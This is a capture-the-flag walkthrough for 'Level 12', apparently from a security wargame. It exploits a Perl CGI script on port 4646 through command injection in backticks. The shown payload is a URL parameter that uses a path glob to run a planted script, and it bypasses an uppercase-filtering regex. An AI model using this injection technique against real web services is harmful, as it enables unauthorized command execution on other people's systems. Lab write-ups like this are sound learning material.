## LEVEL 12

In this level, we search files that we can exploit.  
-> `ls -la` or `la`  
We can see that there's a Perl script and we look up what it contains.  
-> `cat level12.pl`  
We can notice a few things:  
* It hosts a server at *localhost:4646* and uses *CGI*.
* The function **t** is using *Regex* and *backticks*.

> **Backtick** is an operator in Perl that executes a command just as the *execute()* function. All the content in the backticks will be executed then the Perl script will continue.

At a first sight, we can see that the variable *xx* is using Regex to filter through 2 different patterns. But after that, the variable is used within backticks with *egrep*.

> **egrep** is a command that interpret pattern as an extended regular expression. It is the same as `grep -E`.

Therefore, *xx* is used in a regular expression and we can exploit this with backticks to execute a file on our virtual machine.  

> On Linux, the file names and commands are case sensitive.

So, we create a file that will be executable in */var/tmp* that contains the `getflag` command.  
-> `vim /var/tmp/SCRIPT`  
We add the following line,  
-> `getflag > /tmp/flag`  
Then, we give our file execution permission.  
-> `chmod +x /var/tmp/SCRIPT`  
And, we access the server on a browser and give the Perl script an argument using CGI.  
-> ```http://{VM_ip}:4646/?x="`/*/*/SCRIPT`"```  
Finally, we get our flag in */tmp*.  
-> `cat /tmp/flag`  
-> `su level13`